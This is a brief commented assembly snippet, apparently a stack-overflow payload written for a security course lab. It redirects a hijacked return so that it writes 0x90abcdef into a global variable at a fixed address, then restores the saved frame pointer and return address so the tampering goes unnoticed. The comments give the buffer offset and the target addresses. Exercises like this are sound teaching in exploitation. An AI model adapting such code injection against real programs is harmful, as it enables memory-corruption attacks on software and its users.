	# New return address = 0x555555559000
	# Old return address = 0x0000555555555280
	# How many bytes in stack frame from start of buffer = 72 bytes
	# old rbp = dcb0, rsp = dc78, diff = 56
	# &num = 0x555555558038 
	mov $0x555555555280,%rdi
	push %rdi # push the old return address
	mov %rsp, %rdi
	add $56, %rdi
	push %rdi #push main's rbp
	mov $0x555555558038, %rdi
	mov $0x90abcdef, %esi
	mov %esi, (%rdi) #set num to 90abcdef
	pop %rbp
	ret
